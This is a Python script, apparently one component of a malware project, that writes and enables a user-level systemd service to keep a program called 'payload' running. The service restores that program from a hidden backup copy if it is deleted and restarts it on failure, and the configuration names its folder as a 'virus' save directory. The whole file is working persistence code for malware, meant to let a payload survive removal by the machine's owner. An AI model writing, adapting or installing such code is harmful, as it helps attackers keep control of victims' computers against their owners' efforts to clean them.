""""
@author: Vuong Van Duy

setup_systemd.py
data: 14.10.2025

This script creates and installs a systemd unit file that ensures a specified payload program
is always running. If the payload is missing, it attempts to restore it from a backup location.
The unit is configured to start after the graphical session is available and will restart on failure.
"""

import os
import subprocess
import textwrap
from config import UNIT_NAME, UNIT_DIR, DIR_SAVE_VIRUS, BACKUP_DIR_DEFAULT


def create_systemd_unit(progFileName: str = "payload", progFileBackup: str = "payload.bak") -> bool:

    dirSaveVirus = os.path.expanduser(DIR_SAVE_VIRUS)
    backupDir = os.path.expanduser(BACKUP_DIR_DEFAULT)

    try:
        os.makedirs(dirSaveVirus, exist_ok=True)
        os.makedirs(backupDir, exist_ok=True)
    except Exception as e:
        print(f"Error creating backup or virus directory: {e}")
        return False

    unit_content = textwrap.dedent(f"""\
    [Unit]
    Description=Start payload program (self-recovery if lost)
    After=graphical-session.target

    [Service]
    Type=simple

    Environment=PROG={dirSaveVirus}/{progFileName}
    Environment=BACKUP={backupDir}/{progFileBackup}

    WorkingDirectory=%h

    ExecStartPre=/bin/sh -c '[ -x "$PROG" ] || {{ [ -f "$BACKUP" ] && cp "$BACKUP" "$PROG" && chmod +x "$PROG"; :; }}'
    ExecStart=/bin/sh -c '[ -x "$PROG" ] && exec "$PROG" || {{ echo "No payload or backup available, skipping"; exit 0; }}'

    Restart=on-failure
    RestartSec=3
    RemainAfterExit=no

    [Install]
    WantedBy=default.target
""")

    unit_dir = os.path.expanduser(UNIT_DIR)
    try:
        os.makedirs(unit_dir, exist_ok=True)
    except Exception as e:
        print(f"Error creating unit directory {unit_dir}: {e}")
        return False
    unit_path = unit_dir + '/' + UNIT_NAME

    try:
        # Ghi unit file
        print(f"Creating unit file: {unit_path}")
        with open(unit_path, 'w', encoding='utf-8') as f:
            f.write(unit_content)

        # Đặt quyền cho file
        os.chmod(unit_path, 0o644)

        # Reload systemd
        print("Realoading systemd...")
        subprocess.run(["systemctl", "--user", "daemon-reload"], check=True)

        print("Enable service...")
        subprocess.run(["systemctl", "--user", "enable", UNIT_NAME], check=True)

        return True

    except subprocess.CalledProcessError as e:
        print(f"Error running systemd command: {e}")
        return False
    except PermissionError:
        print("Error: No write access /etc/systemd/system/")
        return False
    except Exception as e:
        print(f"Unknown error: {e}")
        return False
